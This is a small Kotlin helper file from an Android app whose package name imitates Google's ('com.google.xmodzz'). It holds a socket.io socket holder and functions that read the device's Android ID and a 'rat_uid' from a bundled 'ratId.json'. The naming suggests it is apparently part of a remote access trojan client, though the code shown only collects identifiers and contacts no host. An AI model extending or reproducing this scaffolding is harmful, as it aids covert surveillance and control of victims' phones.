package com.google.xmodzz

import android.annotation.SuppressLint
import android.content.Context
import android.provider.Settings
import io.socket.client.Socket

object SocketHolder {
    var socket: Socket? = null
}

object Utils {
    @SuppressLint("HardwareIds")
    fun getAndroidId(ctx: Context): String {
        return try {
            Settings.Secure.getString(ctx.contentResolver, Settings.Secure.ANDROID_ID) ?: ""
        } catch (e: Exception) { "" }
    }

    fun getRatUid(ctx: Context): String {
        return try {
            org.json.JSONObject(ctx.assets.open("ratId.json").bufferedReader().use { it.readText() }).optString("rat_uid", "")
        } catch (e: Exception) { "" }
    }
}
